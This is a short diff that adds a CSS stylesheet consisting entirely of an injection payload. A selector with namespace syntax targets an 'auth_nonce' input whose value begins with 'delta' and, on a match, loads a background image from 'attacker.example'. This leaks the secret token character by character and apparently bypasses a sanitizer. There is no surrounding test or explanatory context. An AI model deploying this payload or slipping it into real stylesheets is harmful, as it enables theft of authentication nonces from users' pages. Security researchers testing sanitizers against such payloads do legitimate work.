@@ -1,0 +1,5 @@
+@namespace math url("http://www.w3.org/1998/Math/MathML");
+@namespace svg url("http://www.w3.org/2000/svg");
+math|mtext, input[name="auth_nonce"][value^="delta"] {
+  background-image: url("https://attacker.example/namespace-bypass");
+}
